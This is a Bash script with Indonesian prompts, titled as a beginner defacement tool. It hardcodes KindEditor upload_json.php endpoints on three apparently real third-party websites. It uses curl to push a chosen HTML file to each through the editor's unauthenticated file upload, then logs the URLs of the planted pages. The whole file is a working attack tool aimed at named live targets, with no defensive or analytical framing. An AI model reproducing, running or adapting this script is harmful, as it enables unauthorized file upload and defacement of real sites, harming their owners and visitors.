#!/bin/bash
server=(
    "https://www.soravitgranville.com/Public/kindeditor-415/php/upload_json.php?dir=file"
    "http://www.lsh-hotel.com/kindeditor/php/upload_json.php?dir=file"
    "http://120.76.238.147/spiders/app/component/kindeditor.bak/php/upload_json.php?dir=file"
)

clean_url() {
    local url="$1"
    
    url=$(echo "$url" | sed 's/\\//g')
    
    url=$(echo "$url" | sed 's|\(https\?://\)[^/]*\K//|/|g')
    
    while [[ "$url" == *"/../"* ]]; do
        url=$(echo "$url" | sed 's|[^/]*/\.\./||')
    done
    
    url=$(echo "$url" | sed 's|/\./|/|g')
    
    echo "$url"
}
line() { printf '%*s\n' "$(tput cols)" '' | tr ' ' '='; }
print_ascii() {
    local cols
    cols=$(tput cols)

    local art='
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣏⠉⠉⠉⠉⠉⠉⢡⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡄⠀
⠈⣿⣿⣿⣿⣦⣽⣦⡀⠀⠀⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠀⠀
⠀⠘⢿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠇⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⡟⢿⠻⠛⠙⠉⠋⠛⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠀⠈⠙⢿⡇⣠⣤⣶⣶⣾⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠾⢇⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠱⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠤⢤⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣬⣭⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣠⣴⣾⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣾⣿⣿⣿⣿⡿⠿⠛⠛⠻⣿⣿⣿⣿⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣘⡛⠿⢿⡿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⠿⠛⠉⠁⠀⠈⠉⠙⠛⠛⠻⠿⠿⠿⠿⠟⠛⠃⠀⠀⠀⠉⠉⠉⠛⠛⠛⠿⠿⠿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
'

    while IFS= read -r line; do
        local len=${#line}
        local pad=$(( (cols - len) / 2 ))
        (( pad < 0 )) && pad=0
        printf "%*s%s\n" "$pad" "" "$line"
    done <<< "$art"
}
show_header() {
    line
    printf "%*s\n" $(( ( $(tput cols) + 19 ) / 2 )) "🚀 SIMPLE DEFACE PEMULA"
    line
    echo
}
get_file_path() {
    echo "📁 PILIH FILE HTML"
    echo "══════════════════════════════════════════════════"
    echo ""
    echo "Contoh:"
    echo "  /sdcard/file.html"
    echo "  /storage/emulated/0/Download/index.html"
    echo ""
    
    while true; do
        read -p "👉 Masukkan jalur file: " FILE
        
        if [ -z "$FILE" ]; then
            echo "❌ Masukkan jalur file!"
            continue
        fi
        
        if [ ! -f "$FILE" ]; then
            echo "❌ File '$FILE' tidak ditemukan!"
            echo "   Periksa lagi jalurnya."
            echo ""
            read -p "Coba lagi? (y/n): " retry
            if [[ "$retry" != "y" ]]; then
                return 1
            fi
            echo ""
            continue
        fi
        echo ""
        echo "✅ File ditemukan:"
        echo "   Nama: $(basename "$FILE")"
        echo "   Ukuran: $(du -h "$FILE" | cut -f1)"
        echo "   Lokasi: $(dirname "$FILE")"
        echo ""
        
        read -p "Apakah file ini benar? (y/n): " confirm
        if [[ "$confirm" == "y" ]]; then
            return 0
        fi
        
        echo ""
    done
}
confirm_upload() {
    echo ""
    echo "📊 DETAIL UPLOAD"
    echo "══════════════════════════════════════════════════"
    echo "📁 File    : $(basename "$FILE")"
    echo "📏 Ukuran  : $(du -h "$FILE" | cut -f1)"
    echo "🌐 Server  : ${#server[@]} target"
    echo ""
    echo "Server list:"
    for i in "${!server[@]}"; do
        domain=$(echo "${server[$i]}" | sed 's|https\?://||' | cut -d'/' -f1)
        echo "  [$((i+1))] $domain"
    done
    echo ""
    
    read -p "🚀 Mulai upload sekarang? (y/n): " choice
    [[ "$choice" == "y" ]] && return 0 || return 1
}
upload_all() {
    echo ""
    echo "🔥 PROSES UPLOAD"
    echo "══════════════════════════════════════════════════"
    echo ""
    HASIL="/sdcard/hasil_$(date +%Y%m%d_%H%M%S).txt"
    > "$HASIL"
    
    BERHASIL=0
    
    for i in "${!server[@]}"; do
        url="${server[$i]}"
        domain=$(echo "$url" | sed 's|https\?://||' | cut -d'/' -f1)
        
        echo -n "[$((i+1))/$#] Upload ke $domain... "
        response=$(curl -s -k \
            -H "User-Agent: Mozilla/5.0" \
            -F "imgFile=@$FILE" \
            "$url" 2>&1)
        
        if echo "$response" | grep -q '"error":0'; then
        
            path=$(echo "$response" | grep -o '"url":"[^"]*"' | cut -d'"' -f4)
            base=$(echo "$url" | cut -d'/' -f1-3)
            
    
            if [[ "$path" == /* ]]; then
                full="$base$path"
            elif [[ "$path" == ../* ]]; then
                full="$base/${path:3}"
            else
                full="$base/$path"
            fi
    
            full=$(clean_url "$full")
            
            echo -ne "\r✅ BERHASIL "
            echo " → $full" | tee -a "$HASIL"
            ((BERHASIL++))
        else
            echo "❌ GAGAL"
            echo "   → Error response"
        fi
        
        echo ""
        sleep 1
    done
    echo ""
    echo "💾 Hasil tersimpan di: $HASIL"
    echo ""
    echo "══════════════════════════════════════════════════"
    echo ""
    read -p "📁 Upload file lain? (y/n): " again
    if [[ "$again" == "y" ]]; then
        echo ""
        main
    else
        echo ""
        echo "👋 Selesai. Terima kasih!"
    fi
}
main() {
    print_ascii
    show_header
    if ! get_file_path; then
        echo ""
        echo "❌ Upload dibatalkan!"
        exit 1
    fi
    
    if ! confirm_upload; then
        echo ""
        echo "❌ Upload dibatalkan!"
        exit 0
    fi
    
    upload_all
}
main
